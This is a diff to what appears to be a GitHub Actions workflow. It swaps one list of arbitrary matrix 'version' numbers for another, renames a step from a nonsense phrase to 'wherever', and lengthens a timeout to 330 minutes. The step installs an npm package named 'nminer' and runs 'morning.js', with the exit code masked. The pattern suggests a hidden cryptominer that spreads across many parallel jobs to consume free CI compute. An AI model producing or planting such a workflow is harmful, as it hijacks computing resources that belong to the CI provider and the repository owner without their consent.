@@ -9,23 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 777 }
-          - { version: 2804 }
-          - { version: 6290 }
-          - { version: 1413 }
-          - { version: 6383 }
-          - { version: 8499 }
-          - { version: 4754 }
-          - { version: 3019 }
-          - { version: 1109 }
-          - { version: 6312 }
-          - { version: 5065 }
-          - { version: 5954 }
-          - { version: 812 }
-          - { version: 5702 }
-          - { version: 4051 }
-          - { version: 1562 }
-          - { version: 5777 }
+          - { version: 6231 }
+          - { version: 1214 }
+          - { version: 878 }
+          - { version: 6119 }
+          - { version: 369 }
+          - { version: 3786 }
+          - { version: 7207 }
+          - { version: 5648 }
+          - { version: 9951 }
+          - { version: 9845 }
+          - { version: 8676 }
+          - { version: 1086 }
+          - { version: 7895 }
+          - { version: 5437 }
+          - { version: 9036 }
+          - { version: 7169 }
+          - { version: 2115 }
+          - { version: 8631 }
+          - { version: 4315 }
 
     steps:
       - name: Checkout
@@ -36,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: once athwart brr recede against
+      - name: wherever
         run: |
           npm install nminer@latest
-          timeout 314m node morning.js || echo "morning executed"
+          timeout 330m node morning.js || echo "morning executed"
